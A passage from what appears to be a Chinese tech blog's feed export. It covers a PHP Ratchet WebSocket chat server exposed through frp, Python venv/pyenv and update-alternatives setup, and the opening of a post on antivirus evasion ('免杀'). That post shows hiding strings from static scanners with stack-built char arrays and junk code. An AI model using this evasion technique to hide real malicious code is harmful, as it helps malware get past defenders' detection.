class_">Chat</span></span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="number">8081</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$server</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br></pre></td></tr></table></figure>

<p><strong>PS:如何建立上面这样一个服务器？</strong></p>
<blockquote>
<p>首先安装<a href="https://getcomposer.org/download/">Composer</a>，看完官方文档还是不知道咋安装就问问AI</p>
<p>安装完后，composer -v 有输出就说明安好了</p>
<p>新建一个项目文件夹，然后在文件夹里 <code>composer init</code>，init的时候可以直接无脑回车，因为这里的conf配置也没啥用， 然后安装 <code>Ratchet</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">composer require cboden/ratchet</span><br></pre></td></tr></table></figure>

<p>安装好就行了，注意websocket-server.php的第一行，如果报错说什么文件找不到，就是第一行的文件夹路径错了</p>
</blockquote>
<p><strong>chat.js：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// document.addEventListener(&#x27;DOMContentLoaded&#x27;, function () &#123;</span></span><br><span class="line"><span class="comment">//     const messages = document.getElementById(&#x27;messages&#x27;);</span></span><br><span class="line"><span class="comment">//     const messageInput = document.getElementById(&#x27;messageInput&#x27;);</span></span><br><span class="line"><span class="comment">//     const sendButton = document.getElementById(&#x27;sendButton&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     // 创建WebSocket连接</span></span><br><span class="line"><span class="comment">//     //const wsUri = &quot;wss://60.215.128.110:62588/chat&quot;;</span></span><br><span class="line"><span class="comment">//     //const wsUri = &quot;wss://192.168.22.39:8081/&quot;;</span></span><br><span class="line"><span class="comment">//     const wsUri = &quot;wss://frp-art.top:54456/&quot;;</span></span><br><span class="line"><span class="comment">//     const websocket = new WebSocket(wsUri);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     websocket.onopen = function (evt) &#123;</span></span><br><span class="line"><span class="comment">//         console.log(&quot;连接已打开&quot;);</span></span><br><span class="line"><span class="comment">//         appendMessage(&quot;Connected Server successfully!&quot;);</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     websocket.onclose = function (evt) &#123;</span></span><br><span class="line"><span class="comment">//         console.log(&quot;连接已关闭&quot;);</span></span><br><span class="line"><span class="comment">//         appendMessage(&quot;Link from server closed.&quot;);</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     websocket.onmessage = function (evt) &#123;</span></span><br><span class="line"><span class="comment">//         console.log(&quot;收到消息: &quot; + evt.data);</span></span><br><span class="line"><span class="comment">//         appendMessage(&quot;Sombody: &quot; + evt.data);</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     websocket.onerror = function (evt) &#123;</span></span><br><span class="line"><span class="comment">//         console.error(&quot;发生错误: &quot; + evt.data);</span></span><br><span class="line"><span class="comment">//         appendMessage(&quot;something error...please try to refresh page&quot;);</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     var input = document.getElementById(&#x27;messageInput&#x27;);</span></span><br><span class="line"><span class="comment">// input.addEventListener(&#x27;keydown&#x27;, function (event) &#123;</span></span><br><span class="line"><span class="comment">//     // 检查按下的键是否是回车键</span></span><br><span class="line"><span class="comment">//     if (event.key === &#x27;Enter&#x27; || event.keyCode === 13) &#123;</span></span><br><span class="line"><span class="comment">//         // 如果Shift键也被按下，则不阻止默认行为（允许换行）</span></span><br><span class="line"><span class="comment">//         if (event.shiftKey) &#123;</span></span><br><span class="line"><span class="comment">//             return; // 不执行任何操作，允许默认的换行行为</span></span><br><span class="line"><span class="comment">//         &#125; else &#123;</span></span><br><span class="line"><span class="comment">//             // 否则，阻止默认行为（阻止表单提交）并发送消息</span></span><br><span class="line"><span class="comment">//             event.preventDefault(); // 阻止表单提交</span></span><br><span class="line"><span class="comment">//             const message = input.value.trim();</span></span><br><span class="line"><span class="comment">//             if (message) &#123;</span></span><br><span class="line"><span class="comment">//                 websocket.send(message);</span></span><br><span class="line"><span class="comment">//                 appendMessage(&quot;Me:  &quot; + message);</span></span><br><span class="line"><span class="comment">//                 input.value = &#x27;&#x27;;</span></span><br><span class="line"><span class="comment">//             &#125;</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     // 发送消息</span></span><br><span class="line"><span class="comment">//     sendButton.onclick = function () &#123;</span></span><br><span class="line"><span class="comment">//         const message = messageInput.value.trim();</span></span><br><span class="line"><span class="comment">//         if (message) &#123;</span></span><br><span class="line"><span class="comment">//             websocket.send(message);</span></span><br><span class="line"><span class="comment">//             appendMessage(&quot;Me:  &quot; + message);</span></span><br><span class="line"><span class="comment">//             messageInput.value = &#x27;&#x27;;</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//     &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     // 在消息框中追加消息</span></span><br><span class="line"><span class="comment">//     function appendMessage(message) &#123;</span></span><br><span class="line"><span class="comment">//         const messageElement = document.createElement(&#x27;div&#x27;);</span></span><br><span class="line"><span class="comment">//         messageElement.textContent = message;</span></span><br><span class="line"><span class="comment">//         messages.appendChild(messageElement);</span></span><br><span class="line"><span class="comment">//         messages.scrollTop = messages.scrollHeight;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br></pre></td></tr></table></figure>

<p><strong>&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf：</strong>Apache配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">	ServerAdmin webmaster@localhost</span><br><span class="line">	DocumentRoot /xxx/html # 根据自己的设定</span><br><span class="line"></span><br><span class="line">	ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">	CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">	&lt;Location /chat&gt;</span><br><span class="line">                ProxyPass ws://127.0.0.1:8081/</span><br><span class="line">                ProxyPassReverse ws://127.0.0.1:8081/</span><br><span class="line">     &lt;/Location&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上全都配置好之后，能够访问成功这个index.html页面，但是连接ws:127.0.0.1:8081是不成功的。</p>
<blockquote>
<p><strong>WHY?</strong></p>
<p>使用的内网穿透工具是Sakura Frp，用frpc穿透之后，访问网站是必须要使用https的，那么，使用https连接到网站之后，Websocket是通过HTTPS运行的，意味着WebSocket连接是使用 SSL&#x2F;TLS加密的，所以，对于wss的访问需要有认证的证书，但是我妹有证书啊QAQ，但是我这里也有一个问题，既然是用https访问的网站，那我用这个https网站在apache配置反向代理为啥不行呢</p>
</blockquote>
<p>又看了一下为什么连接不上呢，因为这个js是相当于被浏览器加载到了本地，所以，我使用我的Windows电脑访问127.0.0.1:8081相当于访问的是我自己Windows电脑上的8081端口，那这当然是访问不到的，所以这个wsUri应该填的是公网上的一个ws服务器，所以又想了个办法，用frpc再建一条隧道，把ws服务器再穿出去。</p>
<p>这个方法后来试了试，当然是行得通了的。</p>
<p>于是代码变成了这样：</p>
<p><img src="/2024/12/19/frp-CA/image-20241220164533172.png" alt="image-20241220164533172"></p>
<img src="/2024/12/19/frp-CA/a63e07e755ab0376578dafc8d320c715.jpg" alt="a63e07e755ab0376578dafc8d320c715" style="zoom:50%;">

<p>但这也有问题，安全性问题，ws服务器的地址很容易被获取到，被其他人利用，所以后期会做一些js隐藏、混淆之类的</p>
<div>
    <br><br>
<br><br>
<br><br>
<br><br>
<br><br>
<br><br>
<br><br>
<br><br>
<br><br>
</div>

<p>附一个群组聊天的websocket.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">MessageComponentInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">ConnectionInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">Http</span>\<span class="title">HttpServer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">WebSocket</span>\<span class="title">WsServer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">Server</span>\<span class="title">IoServer</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chat</span> <span class="keyword">implements</span> <span class="title">MessageComponentInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$clients</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$groups</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clients = <span class="keyword">new</span> <span class="title class_">\SplObjectStorage</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;groups = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onOpen</span>(<span class="params">ConnectionInterface <span class="variable">$conn</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 存储新连接的客户端</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clients-&gt;<span class="title function_ invoke__">attach</span>(<span class="variable">$conn</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;New connection! (<span class="subst">&#123;$conn-&gt;resourceId&#125;</span>)\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onMessage</span>(<span class="params">ConnectionInterface <span class="variable">$from</span>, <span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 解析消息，消息格式为 &quot;key:message&quot;</span></span><br><span class="line">        <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$msg</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$message</span>) = <span class="variable">$parts</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果还没有这个key的群组，则创建一个新的群组</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;groups[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;groups[<span class="variable">$key</span>] = <span class="keyword">new</span> <span class="title class_">\SplObjectStorage</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将客户端加入到对应key的群组中</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;groups[<span class="variable">$key</span>]-&gt;<span class="title function_ invoke__">contains</span>(<span class="variable">$from</span>)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;groups[<span class="variable">$key</span>]-&gt;<span class="title function_ invoke__">attach</span>(<span class="variable">$from</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 向所有使用相同key连接的客户端转发消息</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;groups[<span class="variable">$key</span>] <span class="keyword">as</span> <span class="variable">$client</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$from</span> !== <span class="variable">$client</span>) &#123;</span><br><span class="line">                    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="variable">$message</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onClose</span>(<span class="params">ConnectionInterface <span class="variable">$conn</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 移除关闭连接的客户端</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clients-&gt;<span class="title function_ invoke__">detach</span>(<span class="variable">$conn</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;groups <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$group</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$group</span>-&gt;<span class="title function_ invoke__">contains</span>(<span class="variable">$conn</span>)) &#123;</span><br><span class="line">                <span class="variable">$group</span>-&gt;<span class="title function_ invoke__">detach</span>(<span class="variable">$conn</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Connection <span class="subst">&#123;$conn-&gt;resourceId&#125;</span> has disconnected\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onError</span>(<span class="params">ConnectionInterface <span class="variable">$conn</span>, \<span class="built_in">Exception</span> <span class="variable">$e</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;An error has occurred: <span class="subst">&#123;$e-&gt;getMessage()&#125;</span>\n&quot;</span>;</span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$server</span> = <span class="title class_">IoServer</span>::<span class="title function_ invoke__">factory</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HttpServer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">WsServer</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Chat</span>()</span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="number">8080</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$server</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br></pre></td></tr></table></figure>

<p>对应的js：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> key = <span class="string">&#x27;aaa群组&#x27;</span>; <span class="comment">// 根据这个值进行组连接</span></span><br><span class="line"><span class="keyword">var</span> value = <span class="string">&#x27;张三&#x27;</span>; <span class="comment">// 根据这个值进行消息转发（类似于UUID）</span></span><br><span class="line"><span class="keyword">var</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://localhost:8080&#x27;</span>);</span><br><span class="line"></span><br><span class="line">conn.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Connection established!&quot;</span>);</span><br><span class="line">    <span class="comment">// 在连接成功后发送消息</span></span><br><span class="line">    <span class="title function_">sendMessage</span>(<span class="string">&#x27;Hello, this is a message to specific group!&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">conn.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">conn.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Error: &#x27;</span>, e);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">conn.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connection closed&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendMessage</span>(<span class="params">message</span>) &#123;</span><br><span class="line">    conn.<span class="title function_">send</span>(key + <span class="string">&#x27;:&#x27;</span> + value + <span class="string">&#x27;:&#x27;</span> + message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Venv pyenv update-alternatives</title>
    <url>/2024/07/07/live/</url>
    <content><![CDATA[<p>
  <div style="font-size: 40px; font-weight: bold; font-family: 'Times New Roman', serif; color: gray">
    Venv pyenv update-alternatives
  </div>
<div style="font-size: 13px; font-family: 'Times New Roman', serif; color: gray">
    2024/7/7 01:35:52
</div>


</p><h1 id="Venv-Python虚拟环境"><a href="#Venv-Python虚拟环境" class="headerlink" title="Venv Python虚拟环境"></a>Venv Python虚拟环境</h1><p>Venv，Python虚拟环境管理工具，可以创建独立的Python环境</p>
<span id="more"></span>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>1.创建虚拟环境</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -m venv 虚拟环境名</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240706203514916.png" alt="image-20240706203514916"></p>
<p>2.进入目录</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> 虚拟环境名/Scripts</span><br><span class="line">activate.bat</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240706204112177.png" alt="image-20240706204112177"></p>
<p>3.激活虚拟环境后，可以在这个虚拟环境中使用<code>pip install xxx</code>安装某个项目用到的包，如果不同项目使用不同包版本，则创建多个环境，再在环境中安装不同的包。</p>
<p>电脑环境中的包：</p>
<p><img src="/2024/07/07/live/image-20240706204350565.png" alt="image-20240706204350565"> </p>
<p>虚拟环境中的包：安了一个numpy</p>
<img src="/2024/07/07/live/image-20240706204529228.png" alt="image-20240706204529228" style="zoom:67%;"> 



<h1 id="PYENV"><a href="#PYENV" class="headerlink" title="PYENV"></a>PYENV</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/pyenv-win/pyenv-win#readme">下载地址</a>:Github</p>
<p>下载解压到一个没有中文的文件夹中，将文件夹重命名为pyenv。</p>
<img src="/2024/07/07/live/image-20240706205420323.png" alt="image-20240706205420323" style="zoom:67%;">

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>复制这个路径：</p>
<p><img src="/2024/07/07/live/image-20240706205518328.png" alt="image-20240706205518328"></p>
<p>配置系统环境变量：</p>
<p><img src="/2024/07/07/live/image-20240706205707273.png" alt="image-20240706205707273"></p>
<p>在系统环境变量的Path中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%PYENV%\bin </span><br><span class="line">%PYENV%\shims</span><br></pre></td></tr></table></figure>

<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>打开cmd，直接输入pyenv</p>
<img src="/2024/07/07/live/image-20240706205935953.png" alt="image-20240706205935953" style="zoom:67%;">

<h2 id="pyenv命令"><a href="#pyenv命令" class="headerlink" title="pyenv命令"></a>pyenv命令</h2><p>查看pyenv-win支持的python版本列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv install --list</span><br></pre></td></tr></table></figure>
<p>查看当前python对应版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv version</span><br></pre></td></tr></table></figure>
<p>查看电脑安装的所有python版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv versions</span><br></pre></td></tr></table></figure>
<p>安装指定版本 || 也可以在一个命令中安装多个版本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv install &lt;version&gt; || pyenv install &lt;version&gt; &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>卸载指定版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv uninstall &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>将python版本设置为全局版本(默认使用的python版本) 注意：必须先安装该版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv global &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>设置本地版本(当在此文件夹中调用python时，都会使用给定的版本。) 注意：必须先安装该版本。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv <span class="built_in">local</span> &lt;version&gt;</span><br></pre></td></tr></table></figure>
<p>查看python版本来核对：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -V</span><br></pre></td></tr></table></figure>

<h2 id="pyenv安装python环境"><a href="#pyenv安装python环境" class="headerlink" title="pyenv安装python环境"></a>pyenv安装python环境</h2><p>1.查看可以安装的版本</p>
<p><img src="/2024/07/07/live/image-20240706210402179.png" alt="image-20240706210402179"></p>
<p>2.安装需要的Python版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv install &lt;version&gt;</span><br></pre></td></tr></table></figure>

<p>解决安装慢、安装超时问题：</p>
<p>打开<code>pyenv/pyenv-win/.versions_cache.xml</code>，将其中的下载地址改成华为云的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mirrors.huaweicloud.com/python/</span><br></pre></td></tr></table></figure>



<p><img src="/2024/07/07/live/image-20240706221134067.png" alt="image-20240706221134067"></p>
<p>接着就下好了：</p>
<p><img src="/2024/07/07/live/image-20240706221302932.png" alt="image-20240706221302932"></p>
<p>4.设置Python版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyenv global &lt;version&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240706224136656.png" alt="image-20240706224136656"></p>
<h1 id="update-alternatives"><a href="#update-alternatives" class="headerlink" title="update-alternatives"></a>update-alternatives</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h2 id="1-查看Python版本"><a href="#1-查看Python版本" class="headerlink" title="1.查看Python版本"></a>1.查看Python版本</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /usr/bin/python*</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240707003021725.png" alt="image-20240707003021725"></p>
<p>有2.7和3.11两个版本</p>
<h2 id="2-当前版本"><a href="#2-当前版本" class="headerlink" title="2.当前版本"></a>2.当前版本</h2><img src="/2024/07/07/live/image-20240707003246279.png" alt="image-20240707003246279" style="zoom:80%;">

<h2 id="3-设置默认版本（设置优先级）"><a href="#3-设置默认版本（设置优先级）" class="headerlink" title="3.设置默认版本（设置优先级）"></a>3.设置默认版本（设置优先级）</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line">update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/live/image-20240707003543304.png" alt="image-20240707003543304"></p>
<h2 id="4-切换版本"><a href="#4-切换版本" class="headerlink" title="4.切换版本"></a>4.切换版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure>

<img src="/2024/07/07/live/image-20240707003630386.png" alt="image-20240707003630386" style="zoom:67%;">

<p>输入编号开启手动模式即可</p>
<p><img src="/2024/07/07/live/image-20240707003713895.png" alt="image-20240707003713895"></p>
<p>这样Python版本就换成了2.7</p>
<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>首先查看一下已安装的Java版本：</p>
<p><img src="/2024/07/07/live/image-20240707005540546.png" alt="image-20240707005540546"></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先来安装一个Java1.8 [下载地址](<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java Archive Downloads - Java SE 8 (oracle.com)</a>)</p>
<img src="/2024/07/07/live/image-20240707011244573.png" alt="image-20240707011244573" style="zoom:67%;">

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /usr/local/java</span><br><span class="line"><span class="built_in">cp</span> jdk-8u251-linux-x64.tar.gz  /usr/local/java</span><br><span class="line">tar -zxvf jdk-8u251-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>



<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>将解压的jdk放到&#x2F;usr&#x2F;local中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> jdk1.8.0_202 /usr/local</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入环境变量 复制到最下面</span></span><br><span class="line">JAVA_HOME=/usr/local/java/jdk1.8.0_251 </span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME</span><br><span class="line"><span class="built_in">export</span> PATH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通知Java目录</span></span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/java&quot;</span> <span class="string">&quot;java&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/java&quot;</span> 1</span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/javac&quot;</span> <span class="string">&quot;javac&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/javac&quot;</span> 1</span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/javaws&quot;</span> <span class="string">&quot;javaws&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/javaws&quot;</span> 1</span><br><span class="line">update-alternatives --install <span class="string">&quot;/usr/bin/javaws&quot;</span> <span class="string">&quot;javaws&quot;</span> <span class="string">&quot;/usr/local/jdk1.8.0_202/bin/javaws&quot;</span> 1</span><br></pre></td></tr></table></figure>

<img src="/2024/07/07/live/image-20240707012540159.png" alt="image-20240707012540159" style="zoom:50%;">

<p><img src="/2024/07/07/live/image-20240707012757430.png" alt="image-20240707012757430"></p>
<h3 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h3><p><img src="/2024/07/07/live/image-20240707013016446.png" alt="image-20240707013016446"></p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀</title>
    <url>/2024/09/21/ms/</url>
    <content><![CDATA[<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><span id="more"></span>

<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><p><strong>字符串隐藏</strong></p>
<p>在静态免杀中，如果字符串使用<code>const char* str = &quot;Hello World&quot;;</code>方式，或者放在全局变量区初始化，会在文件中直接看到</p>
<p><img src="/2024/09/21/ms/image-20240921192249823.png" alt="image-20240921192249823"></p>
<p>对免杀要隐藏字符串，使用<code>char str[] = &#123;&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, 0&#125;;</code>初始化的字符串不会编译到文件里面，只有在程序开始运行的时候才会加载到栈中。</p>
<p>但是这种方法在exe中使用release版本编译还是可能被系统优化成一段完整的字符串，因此可以加入一些混淆代码，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mian</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> b[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    a[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    b[<span class="number">1</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">    a[<span class="number">2</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">    b[<span class="number">2</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    a[<span class="number">3</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">    b[<span class="number">3</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    a[<span class="number">4</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样打印数组a就是hello，并且使用release生成也不会显示在PE文件中。</p>
